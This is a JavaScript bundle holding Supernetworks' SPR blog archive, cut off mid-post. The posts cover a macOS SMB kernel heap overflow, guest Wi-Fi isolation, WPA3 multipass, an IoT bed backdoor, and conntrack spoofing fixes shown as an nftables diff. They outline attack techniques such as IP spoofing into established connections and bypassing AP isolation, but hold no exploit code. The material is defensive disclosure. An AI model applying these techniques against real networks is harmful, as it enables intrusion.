"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[6840],{71663:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"macos-smb-flaws","metadata":{"permalink":"/pages/blog/macos-smb-flaws","source":"@site/blog/2025-07-01-smblient.md","title":"SMB Flaws in macOS","description":"Supernetworks macOS SMB Client Vulnerabilities","date":"2025-07-01T00:00:00.000Z","tags":[{"inline":true,"label":"smb","permalink":"/pages/blog/tags/smb"},{"inline":true,"label":"fuzzing","permalink":"/pages/blog/tags/fuzzing"},{"inline":true,"label":"macos","permalink":"/pages/blog/tags/macos"},{"inline":true,"label":"apple","permalink":"/pages/blog/tags/apple"}],"readingTime":2.37,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null},{"name":"Dave G","key":"daveg","page":null}],"frontMatter":{"slug":"macos-smb-flaws","title":"SMB Flaws in macOS","authors":["ltsrad","daveg"],"tags":["smb","fuzzing","macos","apple"]},"unlisted":false,"nextItem":{"title":"We\'ve Added Guest SSID Support","permalink":"/pages/blog/guest-ssid-on-spr"}},"content":"Supernetworks macOS SMB Client Vulnerabilities\\n\\n## What to Know\\n\\nSupernetworks identified several vulnerabilities in macOS Sequoia\u2019s SMB client code.  \\nThe worst of which can result in remote kernel code execution via an SMB URL delivered through any application that allows clickable URLs (e.g. messaging apps. Browsers, email client).  This isn\u2019t necessarily a one click attack, as a user may need to click through some UI elements to trigger the exploit. A privileged network position could also be used to carry out a man-in-the-middle attack against a user that typically uses SMB shares. It goes without saying that this also operates as a local privilege escalation from a non privileged user to kernel code execution.\\n\\n\x3c!--truncate --\x3e\\n\\n<div>\\n<video width=\\"100%\\" height=\\"100%\\" playsInline controls src=\\"/pages/video/blogs/smbclient/2025-03-31-smbclient.mov\\" type=\\"video/mp4\\">\\n</video>\\n</div>\\n\\n\\n### Executive Summary\\n\\nSMBClient is the codebase responsible for handling file sharing connections to remote file servers.  This codebase contains a mix of userland and kernel code to allow users to mount Windows and macOS file servers.  A significant portion of the SMB protocol management occurs exclusively in the smbfs kernel extension, which in turn means that SMB represents a kernel attack surface to attackers.  \\n\\nWhile iOS does have SMB support via Files.app, it does not appear to be impacted by any of these vulnerabilities and implements some portion of SMB in userland in addition to not supporting the compression feature.\\n\\n### CVE-2025-24269\\n\\nThis vulnerability is due to a heap overflow within the smb compression code, where an untrusted length value is read from the server and never validated. The flaw relates to the same part of the protocol implementation flaw that affected SMBGhost [(CVE-2020-0796)](https://nvd.nist.gov/vuln/detail/cve-2020-0796) Windows vulnerability.\\n\\nCVE-2025-24269 is also the kind of flaw an LLM happens to be decent at discovering. The commented out code path has a helpful prompt stating developer exasperation.\\n\\n\\n```\\n#if 0\\n                    /*\\n                     * Oddly, Windows server will send a compress length that\\n                     * is bigger than the decompressed length which will cause\\n                     * this check to fail. Why they dont just send the non\\n                     * compressed data?\\n                     *\\n                     * Sanity check the compress length\\n                     */\\n                    if (compress_len > (originalCompressedSegmentSize - CurrentDecompressedDataSize)) {  [2]\\n                        SMBERROR(\\"Algorithm %d compress_len %d > remaining to decompress len %d? \\\\n\\",\\n                                 algorithm, compress_len,\\n                                 (originalCompressedSegmentSize - CurrentDecompressedDataSize));\\n                        error = EINVAL;\\n                        goto bad;\\n                    }\\n#endif\\u2028\u2026\\n```\\n\\nAs the buffer is in a data zone, exploitation will require finding kernel space data buffers worth corrupting remotely, or a bypass of Apple\'s heap zone hardening countermeasures.\\n\\n\\n\\n## Related Work\\n\\nOn Linux Doyensec found a substantial series of flaws with [ksmbd](https://blog.doyensec.com/2025/01/07/ksmbd-1.html),\\nwhich Sean Heelan has also been using to [evaluate o3 and other LLM\'s bug finding abilities](https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/). After SMBleed and SMBGhost, [more flaws](https://support.apple.com/en-us/122373) keep popping up in Microsoft\'s implementation as well.\\n\\n\\n### Remediation\\n\\nThese issues were fixed in [macOS 15.4](https://support.apple.com/en-us/122373).\\n\\n### Technical Details\\n\\nThe technical details for these vulnerabilities can be found at:\\n\\n[http://supernetworks.org/advisores/smbclient-2025.html](http://supernetworks.org/advisores/smbclient-2025.html)."},{"id":"guest-ssid-on-spr","metadata":{"permalink":"/pages/blog/guest-ssid-on-spr","source":"@site/blog/2025-05-15-guest-ssid.md","title":"We\'ve Added Guest SSID Support","description":"SPR now supports dedicated Guest WiFi networks! This convenient feature provides internet access to visitors while maintaining separation from your primary network.","date":"2025-05-15T00:00:00.000Z","tags":[{"inline":true,"label":"guest-ssid","permalink":"/pages/blog/tags/guest-ssid"},{"inline":true,"label":"isolation","permalink":"/pages/blog/tags/isolation"},{"inline":true,"label":"mt7915","permalink":"/pages/blog/tags/mt-7915"}],"readingTime":2.525,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"guest-ssid-on-spr","title":"We\'ve Added Guest SSID Support","authors":["ltsrad"],"tags":["guest-ssid","isolation","mt7915"]},"unlisted":false,"prevItem":{"title":"SMB Flaws in macOS","permalink":"/pages/blog/macos-smb-flaws"},"nextItem":{"title":"Google Just Removed uBlock Origin from the Chrome Store Today!","permalink":"/pages/blog/google-removed-ublock"}},"content":"SPR now supports dedicated Guest WiFi networks! This convenient feature provides internet access to visitors while maintaining separation from your primary network.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Why Guest Networks Matter\\n\\nGuest networks create a separate access point on your router that allows visitors to connect to the internet without accessing your main network. It can be a hassle to go through the SPR setup flow for visistors, so the guest network is configured to work with a static password for ease of use.\\n\\n## Common Problems with Guest Networks\\n\\nWhile guest networks offer convenience, they come with some security compromises that network administrators should understand:\\n\\n### The Shared Password Problem\\nThe Achilles\' heel of most guest networks is the **shared WiFi password**. This single point of failure creates multiple attack vectors:\\n- **Identity Spoofing**: When everyone uses the same credentials, any guest can impersonate another\\n- **Rogue AP Vulnerability**: Attackers with the password can create fake access points mimicking your network to get device\'s traffic\\n- **Traffic Interception**: With WPA2, sophisticated attackers can passively collect and decrypt network traffic\\n\\nWPA3 provides some protection against passive decryption attacks, but doesn\'t solve the fundamental shared-credential vulnerability.\\n\\n### Insufficient Isolation Mechanisms\\nMany router implementations fall short with their isolation strategies:\\n- **Superficial Barriers**: Many systems rely solely on hostapd\'s built-in AP Isolation, which provides a false sense of security\\n- **Routing Vulnerabilities**: Without robust firewall rules, clever attackers can bypass basic isolation methods\\n- **ARP Spoofing**: Inadequate network segmentation can lead to containment failures\\n\\n### SPR\'s Hardened Guest Network\\n\\nSPR takes guest networking seriously by implementing:\\n\\n- **True VLAN Isolation**: Complete network segmentation that goes beyond typical AP isolation\\n- **Defense-in-Depth**: Multiple security layers working together to maintain separation\\n- **Modern Security**: Support for WPA2 and the more secure WPA3 (SAE) authentication protocols\\n- **Policy-Based Routing**: Sophisticated firewall rules that enforce strict boundaries\\n\\n#### Default Policies for Guests\\n\\n- **Internet-Only**: By default, guest devices can only access the internet, not other local network devices\\n- **Device Isolation**: Guest devices cannot communicate with each other, preventing potential lateral attacks\\n- **No API/Router Access**: Guest devices cannot access the router administration panel, API, or SSH\\n\\n![](/img/guest-policy.webp)\\n\\nFor most use cases, we still recommend our primary network\'s **per-device password system** as the gold standard for security. Reserve the guest network for temporary visitors where the convenience/security tradeoff makes sense.\\n\\n## How to Configure\\n\\nSetting up your guest network is straightforward:\\n\\n![](/img/guest-config.webp)\\n\\n1. Navigate to the **Guest Network** tab in the WiFi Settings Pane\\n2. Enable the Guest SSID option\\n3. Configure your authentication settings (we recommend enabling both WPA2 and WPA3)\\n4. Set your Guest SSID name and password\\n5. Save your configuration\\n\\nThe guest network operates on the same radio hardware as your main network. While extra beacons do use up airtime, there\'s no additional hardware needed.\\n\\n## Feedback\\n\\nWe\'d love to hear your feedback on this new feature! Please share your experiences and suggestions on our discord\\n\\n---\\n\\n*Note: Guest SSID support is available on SPR from version 1.0.12*"},{"id":"google-removed-ublock","metadata":{"permalink":"/pages/blog/google-removed-ublock","source":"@site/blog/2025-03-10-ublock-removed-by-google.md","title":"Google Just Removed uBlock Origin from the Chrome Store Today!","description":"uBlock Origin is the best browser-based content blocker available on the web today. And it\'s user supported, free to use.","date":"2025-03-10T00:00:00.000Z","tags":[{"inline":true,"label":"ads","permalink":"/pages/blog/tags/ads"},{"inline":true,"label":"privacy","permalink":"/pages/blog/tags/privacy"},{"inline":true,"label":"tracking","permalink":"/pages/blog/tags/tracking"},{"inline":true,"label":"adblock","permalink":"/pages/blog/tags/adblock"},{"inline":true,"label":"contentblocker","permalink":"/pages/blog/tags/contentblocker"}],"readingTime":1.195,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"google-removed-ublock","title":"Google Just Removed uBlock Origin from the Chrome Store Today!","authors":["ltsrad"],"tags":["ads","privacy","tracking","adblock","contentblocker"]},"unlisted":false,"prevItem":{"title":"We\'ve Added Guest SSID Support","permalink":"/pages/blog/guest-ssid-on-spr"},"nextItem":{"title":"Advancing DecoyAuth is Key to Making WiFi & WPA3 More Secure","permalink":"/pages/blog/wpa3-needs-decoyauth"}},"content":"uBlock Origin is the best browser-based content blocker available on the web today. And it\'s user supported, free to use.\\nSadly today Google just pulled the plug on it by enforcing their new v3 manifest.\\n\\nUsers need to migrate or employ dns based content and ad blocking, which SPR can provide.\\n\\n\x3c!-- truncate --\x3e\\n\\n### A Temporary Workaround ...\\n\\n[uBlock is tracking the situation on Github](https://github.com/uBlockOrigin/uBlock-issues/issues/3563).\\nInside a user provides the following workaround for Chrome Users until June:\\n\\n```\\nDisable:\\n\\nchrome://flags/#extension-manifest-v2-deprecation-warning\\nchrome://flags/#extension-manifest-v2-deprecation-disabled\\nchrome://flags/#extension-manifest-v2-deprecation-unsupported\\n\\nEnable:\\n\\nchrome://flags/#allow-legacy-mv2-extensions\\n```\\n\\n### uBlock Origin Lite\\n\\nRaymond Hill has developed a v3 compatible solution. It\'s available on Chrome today at [uBlock Origin Lite](https://chromewebstore.google.com/detail/ublock-origin-lite/ddkjiahejlhfcafbddmgiahcphecmpfh).\\n\\nUnfortunately, dynamic content blocking is crippled.  Under the guise of \\"performance\\", they\'ve moved to a static, declarative model that limits\\nthe capabilities of browser extensions for this purpose. Most users would probably agree that all the performance needed is recovered by blocking wasteful content from loading.\\nThe [uBlock Origin Lite FAQ](https://github.com/uBlockOrigin/uBOL-home/wiki/Frequently-asked-questions-(FAQ)#filtering-capabilities-which-cant-be-ported-to-mv3) covers the details.\\n\\n### Migrating to Other Browsers\\n\\n[Firefox](https://www.mozilla.org/en-US/firefox/new/?redirect_source=getfirefox-com) and [Brave](https://brave.com/) support uBlock. To use with Brave you should first disable the built in ad Blocker\\n\\n### DNS Based Content Blocking & Ad Blocking\\n\\nSPR supports [builtin content blocking](https://www.supernetworks.org/pages/docs/guides/dns) with domain level controls. Rules can be applied by globally, by device, or by tag, along with dynamic, temporary exceptions. And no software install is needed on the end points. We have a [feature overview](https://www.supernetworks.org/pages/docs/knowledgebase/pihole-technitium-adguard) comparing various dns based ad blocking solutions."},{"id":"wpa3-needs-decoyauth","metadata":{"permalink":"/pages/blog/wpa3-needs-decoyauth","source":"@site/blog/2025-03-06-decoyauth-wpa3-multipass.md","title":"Advancing DecoyAuth is Key to Making WiFi & WPA3 More Secure","description":"Pioneering WiFi Security","date":"2025-03-06T00:00:00.000Z","tags":[{"inline":true,"label":"iot","permalink":"/pages/blog/tags/iot"},{"inline":true,"label":"segmentation","permalink":"/pages/blog/tags/segmentation"},{"inline":true,"label":"isolation","permalink":"/pages/blog/tags/isolation"}],"readingTime":3.36,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"wpa3-needs-decoyauth","title":"Advancing DecoyAuth is Key to Making WiFi & WPA3 More Secure","authors":["ltsrad"],"tags":["iot","segmentation","isolation"]},"unlisted":false,"prevItem":{"title":"Google Just Removed uBlock Origin from the Chrome Store Today!","permalink":"/pages/blog/google-removed-ublock"},"nextItem":{"title":"How to sleep better when your bed is a backdoor","permalink":"/pages/blog/sleep-better-backdoors"}},"content":"## Pioneering WiFi Security\\n\\nSupernetwork\'s [flagship project, SPR, ](https://github.com/spr-networks/super) is a pioneer in\\nWiFi security and we\'ve supported multi-pass WPA3 from the inception of the project in 2022.\\n\\nTo use newer protocols like WiFi 6-e and 7, users can not fall back to WPA2, which is excellent\\nsince WPA2 suffers from passive sniffing & password cracking attacks.\\n\\nWPA3 provides a zero knowledge proof: there\'s no handshake to sniff and crack -- but the protocol is rigid and makes it hard\\nto support multi-pass. So most products only do it for WPA2 sadly, meaning they can\'t operate on 6-e or 7. This leaves users making more bad security tradeoffs.\\nSPR works to give people the best security choices by default but the user experience could still vastly improve.\\n\\nA new project, [DecoyAuth](https://github.com/DistriNet/decoyauth), by Mathy Vanhoef, seeks to do that just that and make WPA3 better support multipass.\\n\\nThe project was presented at PAKE25 and the [slides](https://github.com/DistriNet/decoyauth/blob/main/docs/pake2025-slides.pdf) are here.\\n\\n\x3c!-- truncate --\x3e\\n\\n\\n## The Challenges of WPA3 Multipass\\n\\nOne of the key aspects of multipass is that the password\'s also the secret that marks the identity of the device.\\nWith WPA2, an AP enumerates the passwords it has to identify which devices authenticated, and map it to its VLAN/network.\\n\\nWith WPA3, the zero knowledge proof commitments in SAE mean the AP can only attempt one password per authentication.\\nThis leaves the MAC as the guide for identifying a device. And the protocol in effect can only accept new devices with a wildcard key.\\n\\nThis is what SPR does to support multi-auth for WPA3.  But it has several shortcomings:\\n\\n\\n#### 1. Only one device can be added at a time\\n\\nThere\'s no way to add N devices with N unique passwords out of order. It must be done sequentially,\\nduring a \\"registration\\" phase. This is the `Add Device` flow on SPR. When the new device shows up, the MAC is assigned to that password.\\n\\n#### 2. MAC Randomization\\n\\nIf a device randomizes it\'s MAC, it must be reassigned to the network, or a fixed MAC should be set.\\nThis means there\'s now a privacy tradeoff where the MAC can\'t rotate\\n\\n####  3. Password Sync Breakage\\n\\nWhen Apple devices force password syncing, they all have different MACs. SPR admins have\\nto share the wifi password between all the apple devices, limiting isolation between the ecosystem.\\nFor example, an apple tv, apple watch, and iphone all end up being able to impersonate each other.\\n\\nAddressing these would be amazing for SPR users since they can enjoy multipass without worrying about the above which are more or less a \\"security tax\\".\\nWe should stop designing protocols with security taxes, the best security should be free and effortless, by default.\\n\\n### Existing Workarounds\\n\\nThe IEEE standard does provide a way to pass an identity for SAE to help work around this.\\nQR Codes can specify an identifier. However many clients dont allow manual entry of the identifier when entering a password.\\nThis limits how well this can be applied.\\n\\nAnother shortcoming Vanhoef points out in DecoyAuth is that the identifiers leak in plaintext, and allow user tracking.\\n\\n## DecoyAuth Proposes Advancing Oblivious PAKE (O-PAKE) to resolve WPA3 Multipass\\n\\nThe naive base case is to perform the SAE protocol, for each password, in parallel. This means as more devices\\nare on the network, this is not really feasible, as this causes a linearly increasing amount of packet spam.\\n\\n[O-PAKE](https://eprint.iacr.org/2013/127.pdf) protocols seek to instead allow peers to efficiently try multiple passwords using interpolation.\\n\\nThe [DecoyAuth Project](https://github.com/DistriNet/decoyauth) explores solving applying O-PAKE for WPA3\'s Dragonfly.\\n\\nThe current best proposed approach has the following characteristics where N is the number of passwords:\\n- A polynomial interpolation can be broadcast to all clients (with O(n) size)\\n- AP does O(N) work to authenticate and identify a client\\n\\n## A Call To Action\\n\\nThe need for user friendly WPA3 Multipass is clear.\\n\\n- The current OPAKE solution breaks down as clients are added. Can many clients be supported?\\n- The protocol needs cryptographic security analysis\\n\\n\\n![decoy-auth](/img/decoyauth-1.jpg)"},{"id":"sleep-better-backdoors","metadata":{"permalink":"/pages/blog/sleep-better-backdoors","source":"@site/blog/2025-02-27-sleepwell.md","title":"How to sleep better when your bed is a backdoor","description":"How to Sleep Better When Your Bed is a Backdoor","date":"2025-02-27T00:00:00.000Z","tags":[{"inline":true,"label":"iot","permalink":"/pages/blog/tags/iot"},{"inline":true,"label":"segmentation","permalink":"/pages/blog/tags/segmentation"},{"inline":true,"label":"isolation","permalink":"/pages/blog/tags/isolation"}],"readingTime":2.385,"hasTruncateMarker":true,"authors":[{"name":"Dave G","key":"daveg","page":null}],"frontMatter":{"slug":"sleep-better-backdoors","title":"How to sleep better when your bed is a backdoor","authors":["daveg"],"tags":["iot","segmentation","isolation"]},"unlisted":false,"prevItem":{"title":"Advancing DecoyAuth is Key to Making WiFi & WPA3 More Secure","permalink":"/pages/blog/wpa3-needs-decoyauth"},"nextItem":{"title":"Security Fixes & Conntrack Hardening in SPR","permalink":"/pages/blog/spr-conntrack-hardening"}},"content":"## How to Sleep Better When Your Bed is a Backdoor\\n\\nThe folks at over at Truffle Security performed some excellent research on the Eight Sleep Internet connected bed [\\"Removing Jeff Bezos From My Bed \u25c6 Truffle Security Co.](https://trufflesecurity.com/blog/removing-jeff-bezos-from-my-bed) .  It will come as no surprise to anyone who follows IoT security that the bed has some serious security problems, most notably the ability for Eight Sleep\'s engineering team to be able to ssh in to the bed\'s on-board computer, via what appears to be a shared support account.\\n\\n\x3c!-- truncate --\x3e\\n\\n### What can one do with this kind of access?\\n\\nLet\'s start with the basics:  \\n> They can know when you sleep  \\n> They can detect when there are 2 people sleeping in the bed instead of 1  \\n> They can know when it\'s night, and no people are in the bed  \\n> Imagine your ex works for Eight Sleep. Or imagine they want to know when you\'re not home.  \\n> (Of course, they can also change the bed\'s temperature, turn on the vibrating feature, turn off your alarm clock, and any of the other normal controls they have power over.)  \\n> Beyond the basics, what does access to a device on your home network grant them? Any other device connected to that home network - smart fridges, smart stoves, smart washing machines, laptops - is typically routable via your bed. The (in)security of those devices is now entrusted to random Eight Sleep engineers.\\n\\nIt\'s easy to focus on the immediate access this gives to the information that this gives Eight Sleep, but generally speaking, using IoT devices like this generally means you\'ve chosen to give up some level of privacy.  \\n\\n**The part that you definitely didn\'t sign up for was the sheer number of devices that intentionally and/or unintentionally provide remote access into a network that typically allows every device to talk to every other device.**\\n\\n**An attacker could:**\\n* **Passively observe network traffic on your home network by sniffing**\\n* **Attack other devices by using Machine In The Middle technique against other WiFi Devices with shared passwords**\\n* **Get precise location information by sniffing nearby SSIDs**\\n* **Extend their access to other devices by exploiting poor configuration and vulnerabilities in the remote attack surface of other network devices**\\n\\nAnd if you think you can just shut off internet access to this bed, you\'d be wrong.  Like an increasing number of devices, it requires internet access to function.  While the blog post does have a hack that allows you to replace the WiFi connected device with an aquarium chiller.  This is impractical for most people, especially if you think about how many other IoT devices there are in your home.  \\n\\nThe best solution to this problem is device isolation.  Many modern enterprises already do this, and your home deserves the same level of security."},{"id":"spr-conntrack-hardening","metadata":{"permalink":"/pages/blog/spr-conntrack-hardening","source":"@site/blog/2024-10-16-conntrack-hardening.md","title":"Security Fixes & Conntrack Hardening in SPR","description":"Anvil Secure recently published a post and whitepaper covering conntrack flaws that are common with many linux routers and linux \\"multihomed\\" devices. In this post we\'ll cover SPR, how our process mitigated the highest risk vulnerabilities, how we fixed the rest and other improvements we\'re making to be resilient against attacks like this in the future.","date":"2024-10-16T00:00:00.000Z","tags":[{"inline":true,"label":"firewall","permalink":"/pages/blog/tags/firewall"},{"inline":true,"label":"conntrack","permalink":"/pages/blog/tags/conntrack"}],"readingTime":7.46,"hasTruncateMarker":true,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad","page":null}],"frontMatter":{"slug":"spr-conntrack-hardening","title":"Security Fixes & Conntrack Hardening in SPR","authors":["ltsrad"],"tags":["firewall","conntrack"]},"unlisted":false,"prevItem":{"title":"How to sleep better when your bed is a backdoor","permalink":"/pages/blog/sleep-better-backdoors"},"nextItem":{"title":"Locking Down Multicast Services with SPR","permalink":"/pages/blog/spr-and-cups-multicast-vulnerability"}},"content":"Anvil Secure recently published a [post](https://anvilsecure.com/blog/spoofing-internal-packets-for-multihomed-linux-devices.html) and [whitepaper](https://www.anvilsecure.com/wp-content/uploads/2024/10/Conntrack-Spoofing-Internal-Packets-Whitepaper-1.pdf) covering conntrack flaws that are common with many linux routers and linux \\"multihomed\\" devices. In this post we\'ll cover SPR, how our process mitigated the highest risk vulnerabilities, how we fixed the rest and other improvements we\'re making to be resilient against attacks like this in the future.\\n\\n## Overview\\n\\n[Conntrack](https://conntrack-tools.netfilter.org/manual.html) is part of Linux Netfilter and is an integral part of a stateful firewall for allowing Network Address Translation on a network.  A router uses it to allow clients to establish connections through the uplink interfaces.\\n\\nAnvil Secure published details on how devices often fail to lock down their firewalls correctly since Conntrack operates at layer 3. External attackers that are one hop away can abuse this to spoof IP addresses and send traffic to internal interfaces on devices and routers for an established connection managed with conntrack.  For most of our users, this limits the attack to compromised or hostile ISP providers, which is an uncommon (but not unheard of attack vector).  However, since the WiFi Pod can be used as a travel router, it\'s important to us that they are can withstand being attached to a hostile network.\\n\\nThe riskiest of the attacks happen to not affect SPR.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Potential Attacks\\n\\n### Attack #1: The uplink interface reaching internal services on the router that are not meant to be accessible to the outside\\n\\n- Severity: High\\n- Status: Not Vulnerable\\n\\n:::info\\n\\nSPR\'s firewall explicitly matches interfaces to the service ports on the router, so the uplink interface can only connect to service ports if they\'re explicitly set to be externally facing, even with IP spoofing.\\n\\n:::\\n\\n\\n\\n### Attack #2: Punching holes in a router firewall with NAT-PMP\\n\\n- Severity: High\\n- Status: Not Vulnerable\\n\\n:::info\\n\\nSPR does not run NAT-PMP.\\n\\n:::\\n\\n### Attack #3: IP Spoofing On External Service Ports\\n\\n- Severity: Medium\\n- Status: Patched in v1.0.1\\n\\n:::info\\n\\nThe uplink connection to an externally exposed service port could spoof the IP address to match an established connection and blindly send UDP packets by spamming source ports or the same for TCP (if they can guess the sequence numbers plus the source port). This traffic could then present itself on a connection between SPR and a LAN client.\\n\\n:::\\n\\n### Attack #4: VLAN Routing with Spoofed IPs against Service Ports\\n\\n- Severity: Low\\n- Status: Patched in v1.0.1\\n\\n:::info\\n\\nSimilarly, VLANs could also perform the same attack against each other internally to attempt to inject traffic into an established connection.\\n\\n:::\\n\\n\\n### Attack Indicators\\n\\n:::tip\\n\\nSPR logs dropped packets and has [alerts](/pages/docs/guides/alerts) for MAC spoofing. In the process of running the attack, the source ports must be enumerated to match the established internal connection. This would create `nft:drop:mac` events when the attacker scans for an established source port. Users can see dropped packets under the alerts pane. To filter the external interface, the filter can be set to `Event.InDev==\\"eth0\\"` for example if the uplink interface is `eth0`.\\n\\n:::\\n\\n## On VPN/Docker\\n\\n[Port Shadow](https://citizenlab.ca/2024/07/vulnerabilities-in-vpns-paper-presented-at-the-privacy-enhancing-technologies-symposium-2024/) attacks are a similar issue. On a shared VPN host with multiple users a malicious adversary could use the VPN\'s destination port as the source port to confuse stateful firewall rules into redirecting traffic to set up a MITM attack. SPR hardens against this attack by blocking source ports on the [wireguard port](https://github.com/spr-networks/super/blob/1f3799ffb82dd758bb9936c05e8812bbe5870063/base/scripts/nft_rules.sh#L256)\\n\\nSPR also runs as a VPN under a virtualized docker network. In this scenario SPR does not manage the host firewall, and relies on Docker\'s host rules for forwarding services. We cover network attacks against [Container Networks](https://www.supernetworks.org/pages/blog/docker-networking-containment) in a prior post.  In SPR we harden against attacks on Docker\'s overly premissive networking rules by [limiting API access to the container network](https://github.com/spr-networks/super/blob/1f3799ffb82dd758bb9936c05e8812bbe5870063/base/scripts/nft_rules.sh#L271) interface and subnets.  \\n\\n## On Wi-Fi\\n\\nAnvils\' writeups have great information, and one especially good gem of wisdom in the whitepaper is as follows:\\n\\n**\\"For example, on NAT router[s] supporting both Wi\u2011Fi and Ethernet, a communications between two Wi\u2011Fi clients are likely to stay on the Wi\u2011Fi chip.\\"**\\n\\nThis is because with WPA the typical operation is that when station PeerA transmits to PeerB it will encrypt with it\'s unicast pariwise temporal key (PTK) and send a packet to the AP with Receiver Address(RA)=BSSID and Destination Address (DA). The AP re-encryptes the traffic with PeerB\'s PTK and sends it without going through the OS networking stack.\\n\\nMany Guest networks rely on this bridging to be blocked when hostapd has \\"ap_isolate=1\\" enabled. Unfortunately most setups don\'t do any hardening against routing. So if an adversary instead transmits with RA=DA=BSSID and the IP Destination of PeerB, the router will happily route the packet to PeerB over the networking stack, and then re-encrypt the traffic with the PeerB PTK .\\n\\nAs this next part from the whitepaper mentions, bridging mediums is even more susceptible since they must go through the routing tables (and in turn imply a round trip is possible with spoofing attacks to also receive traffic).\\n\\n**\\"A Wi\u2011Fi client communicating with an Ethernet host on the other hand, could pass through the NAT router via the bridge\\"**\\n\\nIn SPR we defend against WiFi-based attacks as follows:\\n- We set ap_isolate=1 to avoid L2 bridging in the chipset where the AP re-encrypts unicast traffic to the other peer\\n- We use Per-Station VLANs with unique group keys for each to avoid GTK-based communications bypassing the AP\\n- We support unique device WPA2/3 passwords to block rogue AP attacks as well as passive key derivation on WPA2.\\n- We use MAC filters to stop IP spoofing without knowing the spoofed device\'s WiFi password & MAC address.  \\n\\nWith conntrack we had some exposure  (#4 above), where established connections could be spoofed into SPR\'s service ports across VLANs to bypass the MAC filter.\\n\\n## The fixes\\n\\nTo address the issues we\'ve added rules to explicitly block LAN IP ranges from/to the uplink interfaces on the INPUT tables [1].\\nSecondly we\'ve moved the MAC filters [2] before the conntrack rules.\\n\\n\\n\\n```diff\\ndiff --git a/base/scripts/nft_rules.sh b/base/scripts/nft_rules.sh\\nindex 7b96abd6..b03545fd 100755\\n--- a/base/scripts/nft_rules.sh\\n+++ b/base/scripts/nft_rules.sh\\n@@ -1,8 +1,5 @@\\n #!/bin/bash\\n\\n-#TBD:\\n-#- can F_EST_RELATED be moved past MAC spoof check\\n-\\n # Disable forwarding\\n sysctl net.ipv4.ip_forward=0\\n\\n@@ -246,6 +243,10 @@ table inet filter {\\n     iifname @uplink_interfaces log prefix \\"wan:in \\" group 0\\n     iifname != @uplink_interfaces log prefix \\"lan:in \\" group 0\\n\\n+    # block lan ranges from uplink interfaces #[1]\\n+    iifname @uplink_interfaces ip saddr @supernetworks goto DROPLOGINP\\n+    iifname @uplink_interfaces ip daddr @supernetworks goto DROPLOGINP\\n+\\n     # Drop input from the site to site output interfaces. They are only a sink,\\n     # Not a source that can connect into SPR services\\n     counter iifname @outbound_sites goto DROPLOGINP\\n@@ -270,7 +271,6 @@ table inet filter {\\n     $(if [ \\"$VIRTUAL_SPR_API_INTERNET\\" ]; then echo \\"\\" ;  elif [[ \\"$WAN_NET\\" ]]; then echo \\"counter iifname @uplink_interfaces tcp dport 80, 443 ip saddr != $WAN_NET drop\\"; fi)\\n     $(if [ \\"$VIRTUAL_SPR_API_INTERNET\\" ]; then echo \\"\\" ;  elif [[ \\"$WAN_NET\\" ]]; then echo \\"counter iifname @uplink_interfaces udp dport 53, 67 ip saddr != $WAN_NET drop\\"; fi)\\n\\n-    counter jump F_EST_RELATED # [2]\\n\\n     # DHCP Allow rules\\n     # Wired lan\\n@@ -284,6 +284,8 @@ table inet filter {\\n     # Prevent MAC Spoofing from LANIF, wired interfaces\\n     iifname @lan_interfaces jump DROP_MAC_SPOOF\\n\\n+    counter jump F_EST_RELATED # [2]\\n+\\n     # DNS Allow rules\\n     # Docker can DNS\\n     $(if [ \\"$DOCKERIF\\" ]; then echo \\"iif $DOCKERIF ip saddr $DOCKERNET udp dport 53 counter accept\\"; fi)\\n@@ -343,6 +345,15 @@ table inet filter {\\n     # Allow DNAT for port forwarding\\n     counter ct status dnat accept\\n\\n+    # block lan ranges from uplink interfaces\\n+    # uplinks can not NAT FROM @supernetworks source addresses\\n+    iifname @uplink_interfaces ip saddr @supernetworks goto DROPLOGFWD\\n+    # uplinks can not receive @supernetworks destination addresses\\n+    oifname @uplink_interfaces ip daddr @supernetworks goto DROPLOGFWD\\n+\\n+    # Verify MAC addresses for LANIF/WIPHYs\\n+    iifname @lan_interfaces jump DROP_MAC_SPOOF [2]\\n+\\n     counter jump F_EST_RELATED\\n\\n     # Do not forward from uplink interfaces after dnat\\n@@ -355,8 +366,6 @@ table inet filter {\\n     oifname @uplink_interfaces log prefix \\"wan:out \\" group 0\\n     oifname != @uplink_interfaces log prefix \\"lan:out \\" group 0\\n\\n-    # Verify MAC addresses for LANIF/WIPHYs\\n-    iifname @lan_interfaces jump DROP_MAC_SPOOF  [2]\\n\\n     # After MAC SPOOF check, but before rfc1918 check\\n     # These rules allow permits via endpoint verdict maps\\n@@ -432,6 +441,8 @@ table inet filter {\\n\\n   chain OUTPUT {\\n     type filter hook output priority 0; policy accept\\n+    oifname @uplink_interfaces ip daddr @supernetworks goto DROPLOGOUTP\\n+    oifname @uplink_interfaces ip saddr @supernetworks goto DROPLOGOUTP\\n   }\\n\\n   chain DROPLOGFWD {\\n@@ -444,6 +455,11 @@ table inet filter {\\n     counter drop\\n   }\\n\\n+  chain DROPLOGOUTP {\\n+    counter log prefix \\"drop:output \\" group 1\\n+    counter drop\\n+  }\\n+\\n   chain F_EST_RELATED {\\n     ip protocol udp ct state related,established counter accept\\n     ip protocol tcp ct state related,established counter accept\\n@@ -472,11 +488,6 @@ table inet nat {\\n     $(if [ \\"$LANIF\\" ]; then echo \\"elements = { $LANIF }\\" ; fi )\\n   }\\n\\n ```"},{"id":"spr-and-cups-multicast-vulnerability","metadata":{"permalink":"/pages/blog/spr-and-cups-multicast-vulnerability","source":"@site/blog/2024-09-26-firewalling-multicast.md","title":"Locking Down Multicast Services with SPR","description":"Here is an overview of how SPR helps defend users against attacks with multicast services. The capabilities let SPR users enjoy the 